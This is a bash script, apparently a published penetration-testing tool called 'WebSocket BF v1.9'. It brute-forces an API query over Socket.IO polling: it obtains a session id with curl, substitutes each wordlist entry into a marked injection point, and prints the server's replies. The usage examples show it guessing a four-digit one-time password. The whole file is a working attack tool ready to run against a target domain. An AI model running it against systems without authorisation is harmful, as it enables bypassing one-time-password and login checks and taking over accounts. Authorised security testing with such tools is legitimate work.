#!/bin/bash

start=$(date "+%s.%N")

# -------------------------- INFO --------------------------

function basic () {
	proceed=false
	echo "WebSocket BF v1.9 ( github.com/ivan-sincek/websocket-bf )"
	echo ""
	echo "--- Single request ---"
	echo "Usage:   ./websocket_bf.sh -d domain              -p payload                             [-t token            ]"
	echo "Example: ./websocket_bf.sh -d https://example.com -p '42[\"verify\",\"{\\\"otp\\\":\\\"1234\\\"}\"]' [-t xxxxx.yyyyy.zzzzz]"
	echo ""
	echo "--- Brute force ---"
	echo "Usage:   ./websocket_bf.sh -d domain              -p payload                                     -w wordlist             [-t token            ]"
	echo "Example: ./websocket_bf.sh -d https://example.com -p '42[\"verify\",\"{\\\"otp\\\":\\\"<injection/>\\\"}\"]' -w all_numeric_four.txt [-t xxxxx.yyyyy.zzzzz]"
}

function advanced () {
	basic
	echo ""
	echo "DESCRIPTION"
	echo "    Brute force a REST API query through WebSocket"
	echo "DOMAIN"
	echo "    Specify a target domain and protocol"
	echo "    -d <domain> - https://example.com | https://192.168.1.10 | etc."
	echo "PAYLOAD"
	echo "    Specify a query/payload to brute force"
	echo "    Make sure to enclose it in single quotes"
	echo "    Mark the injection point with <injection/>"
	echo "    -p <payload> - '42[\"verify\",\"{\\\"otp\\\":\\\"<injection/>\\\"}\"]' | etc."
	echo "WORDLIST"
	echo "    Specify a wordlist to use"
	echo "    -w <wordlist> - all_numeric_four.txt | etc."
	echo "TOKEN"
	echo "    Specify a token to use"
	echo "    -t <token> - xxxxx.yyyyy.zzzzz | etc."
}

# -------------------- VALIDATION BEGIN --------------------

# my own validation algorithm

proceed=true

# $1 (required) - message
function echo_error () {
	echo "ERROR: ${1}" 1>&2
}

# $1 (required) - message
# $2 (required) - help
function error () {
	proceed=false
	echo_error "${1}"
	if [[ $2 == true ]]; then
		echo "Use -h for basic and --help for advanced info" 1>&2
	fi
}

declare -A args=([domain]="" [wordlist]="" [payload]="" [token]="")

# $1 (required) - key
# $2 (required) - value
function validate () {
	if [[ ! -z $2 ]]; then
		if [[ $1 == "-d" && -z ${args[domain]} ]]; then
			args[domain]=$2
		elif [[ $1 == "-w" && -z ${args[wordlist]} ]]; then
			args[wordlist]=$2
			if [[ ! -e ${args[wordlist]} ]]; then
				error "Wordlist does not exists"
			elif [[ ! -r ${args[wordlist]} ]]; then
				error "Wordlist does not have read permission"
			elif [[ ! -s ${args[wordlist]} ]]; then
				error "Wordlist is empty"
			fi
		elif [[ $1 == "-p" && -z ${args[payload]} ]]; then
			args[payload]=$2
		elif [[ $1 == "-t" && -z ${args[token]} ]]; then
			args[token]=$2
		fi
	fi
}

# $1 (required) - argc
# $2 (required) - args
function check() {
	local argc=$1
	local -n args_ref=$2
	local count=0
	for key in ${!args_ref[@]}; do
		if [[ ! -z ${args_ref[$key]} ]]; then
			count=$((count + 1))
		fi
	done
	echo $((argc - count == argc / 2))
}

if [[ $# == 0 ]]; then
	advanced
elif [[ $# == 1 ]]; then
	if [[ $1 == "-h" ]]; then
		basic
	elif [[ $1 == "--help" ]]; then
		advanced
	else
		error "Incorrect usage" true
	fi
elif [[ $(($# % 2)) -eq 0 && $# -le $((${#args[@]} * 2)) ]]; then
	for key in $(seq 1 2 $#); do
		val=$((key + 1))
		validate "${!key}" "${!val}"
	done
	if [[ -z ${args[domain]} || -z ${args[payload]} || $(check $# args) -eq false ]]; then
		error "Missing a mandatory option (-d, -p) and/or optional (-w, -t)" true
	fi
else
	error "Incorrect usage" true
fi

# --------------------- VALIDATION END ---------------------

# ----------------------- TASK BEGIN -----------------------

# $1 (required) - domain
# $2 (optional) - token
function get_sid () {
	# add/modify the HTTP request header and/or any other query parameters as necessary
	# EIO       (required) - version of the Engine.IO protocol
	# transport (required) - transport being established
	curl -s -H "Connection: close" -H "Accept-Encoding: gzip, deflate" -H "Authorization: Bearer ${2:-null}" "${1}/socket.io/?EIO=3&transport=polling" | gunzip -c | grep -Po '(\{(?:[^\{\}]+|(?-1))+\})' | jq -r '.sid' 2>/dev/nul
}

# $1 (required) - domain
# $2 (required) - sid
# $3 (required) - payload
# $4 (optional) - token
function send_payload () {
	# add/modify the HTTP request header and/or any other query parameters as necessary
	# EIO       (required) - version of the Engine.IO protocol
	# transport (required) - transport being established
	curl -s -H "Connection: close" -H "Accept-Encoding: gzip, deflate" -H "Authorization: Bearer ${4:-null}" "${1}/socket.io/?EIO=3&transport=polling&sid=${2}" --data "${3}"
}

# $1 (required) - domain
# $2 (required) - sid
# $3 (optional) - token
function fetch_results () {
	# add/modify the HTTP request header and/or any other query parameters as necessary
	# EIO       (required) - version of the Engine.IO protocol
	# transport (required) - transport being established
	curl -s -H "Connection: close" -H "Accept-Encoding: gzip, deflate" -H "Authorization: Bearer ${3:-null}" "${1}/socket.io/?EIO=3&transport=polling&sid=${2}" | gunzip -c
}

if [[ $proceed == true ]]; then
	echo "#############################################################"
	echo "#                                                           #"
	echo "#                     WebSocket BF v1.9                     #"
	echo "#                             by Ivan Sincek                #"
	echo "#                                                           #"
	echo "# Brute force a REST API query through WebSocket.           #"
	echo "# GitHub repository at github.com/ivan-sincek/websocket-bf. #"
	echo "#                                                           #"
	echo "#############################################################"
	if [[ ! -z ${args[wordlist]} ]]; then
		count=0
		for entry in $(cat "${args[wordlist]}" | grep -Po '[^\s]+'); do
			count=$((count + 1))
			sid=$(get_sid "${args[domain]}" "${args[token]}")
			echo ""
			echo "#${count} | entry: ${entry} | sid: ${sid:-failed}"
			if [[ ! -z $sid ]]; then
				echo ""
				data="${args[payload]//<injection/>/$entry}"
				data="${#data}:${data}"
				send_payload "${args[domain]}" "${sid}" "${data}" "${args[token]}"
				echo $(fetch_results "${args[domain]}" "${sid}" "${args[token]}")
			fi
		done
	else
		sid=$(get_sid "${args[domain]}" "${args[token]}")
		echo ""
		echo "sid: ${sid:-failed}"
		if [[ ! -z $sid ]]; then
			echo ""
			data="${#args[payload]}:${args[payload]}"
			send_payload "${args[domain]}" "${sid}" "${data}" "${args[token]}"
			echo $(fetch_results "${args[domain]}" "${sid}" "${args[token]}")
		fi
	fi
	end=$(date "+%s.%N")
	runtime=$(echo "${end} - ${start}" | bc -l)
	echo ""
	echo "Script has finished in ${runtime}"
fi

# ------------------------ TASK END ------------------------
